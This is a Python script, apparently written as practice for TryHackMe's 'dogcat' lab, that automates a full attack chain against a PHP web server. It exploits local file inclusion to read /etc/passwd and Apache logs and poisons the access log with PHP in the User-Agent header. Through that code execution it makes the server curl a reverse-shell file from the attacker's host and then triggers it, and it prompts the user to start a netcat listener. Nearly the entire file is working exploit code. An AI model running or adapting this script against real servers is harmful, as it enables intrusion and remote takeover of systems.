#!/usr/bin/python3

#####
# Script Author: Flikk
# https://github.com/imflikk/tryhackme_solution_scripts
#
# Some practice using Python to automatically solve most of the 'dogcat'
# machine from TryHackMe.com.  This script will confirm the LFI, read log
# files, poison those log files, upload a PHP reverse shell to the
# web server, and finally activate the shell.
#
# Credit to TryHackMe.com for creating the dogcat machine
#
# Tested on ParrotOS with Python 3.8.2
#####

import argparse
import requests
import sys
import socket
import subprocess
from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE
import netifaces
from time import sleep


def lfi_check(url):
	lfi_url = url + "dogs/../../../../../../etc/passwd&ext="
	r = requests.get(lfi_url)
	if "root:x" in r.text:
		print("[+]LFI successful at " + lfi_url + "[+]\n")
		return True
	else:
		return False
		
def log_check(url):
	log_url = url + "dogs/../../../../../../var/log/apache2/access&ext=.log"
	r = requests.get(log_url)
	if "GET /?view=" in r.text:
		print("[+]Successfully read Apache access.log file![+]\n")
		return True
	else:
		return False
		
def poison_logs(url):
	poison_url = url + "dog"
	headers = {
		"User-Agent": "OUTPUT=<?php system('whoami'); ?>"
	}
	
	poison_r = requests.get(poison_url, headers=headers)
	
	log_check_url = url + "dogs/../../../../../../var/log/apache2/access&ext=.log"
	check_r = requests.get(log_check_url)
	if "OUTPUT=www-data" in check_r.text:
		print("[+]Successfully poisoned access.log file![+]\n")
		return True
	else:
		return False
		
def upload_shell(ip, url):
	print("Starting Python HTTP Server to serve rev.php...\n")
	subprocess.Popen(["python3","-m","http.server","80"])
	sleep(2)
	print("\nUsing poisoned log file to upload rev.php to /var/www/html directory...\n")
	sleep(2)
	
	poison_url = url + "dog"
	my_ip = get_ip_address()
	headers = {
		"User-Agent": "OUTPUT=<?php system('curl http://" + my_ip + "/rev.php -o /var/www/html/rev.php'); ?>"
	}
	
	poison_r = requests.get(poison_url, headers=headers)
	
	print("Shell uploaded.  Checking that it exists in web directory...\n")
	sleep(2)
	
	shell_check_r = url + "dogs"
	headers = {
		"User-Agent": "OUTPUT=<?php system('ls -al /var/www/html'); ?>"
	}
	
	shell_check_r = requests.get(shell_check_r, headers=headers)
	
	log_check_url = url + "dogs/../../../../../../var/log/apache2/access&ext=.log"
	check_r = requests.get(log_check_url)
	if " rev.php" in check_r.text:
		print("\n[+]Successfully uploaded shell to root web directory (http://" + ip + "/rev.php)[+]\n")
		print("Shutting down Python web server...\n")
		subprocess.call(["fuser","-k","80/tcp"])
		return True
	else:
		return False
		
def activate_rev_shell(ip, url):

	shell_url = "http://" + ip + "/rev.php"
	
	print("Requesting " + shell_url + ", shell should be coming.\n")
	activate_shell_r = requests.get(shell_url)
	exit(0)
	
	
	
def get_ip_address():
    ip = netifaces.ifaddresses('tun0')[AF_INET][0]['addr']
    return ip
	


def main():
	
	if len(sys.argv) < 2 or len(sys.argv) > 2:
		print("Please use the format 'python3 dogcat.py <target IP>'")
		exit(0)
		fuser
	ip = sys.argv[1]
	url = "http://" + ip + "/?view="
	
	print("Before continuing, you need to download and edit the file below to include your VPN (usually tun0) IP and the port you want to catch the reverse shell on.\n")
	print("----https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php---\n")
	
	shell_available = input("Is this file updated, in your current directory, and named 'rev.php'?  (y/n)")
	
	if shell_available.lower() == "n":
		print("\nPlease follow the suggestion above before continuing.")
		exit(0)
		
	print("\nPlease start a netcat listener on the port you set in rev.php (nc -lvnp <port>)")
	nc_set = input("\nIs the listener started?  ")
	
	if nc_set.lower() != "y":
		print("\nPlease start the netcat listener and re-run the script.")
		exit(0)
	
	print("\nTarget URL: " + url + "\n")
	print("Checking for LFI...\n")
	sleep(1)

	if lfi_check(url):
		print("Trying to read Apache logs...\n")
		sleep(2)
	else:
		print("[-]LFI did not work successfully, exiting.[-]")
		exit(0)
		
	if log_check(url):
		print("Trying to poison logs...\n")
		sleep(2)
	else:
		print("[-]Unable to read Apache logs, exiting.[-]")
		exit(0)
		
	if not poison_logs(url):
		print("[-]Unable to poison logs, exiting.[-]")
		exit(0)
		
	if upload_shell(ip, url):
		activate_rev_shell(ip, url)

	

if __name__ == "__main__":
	main()
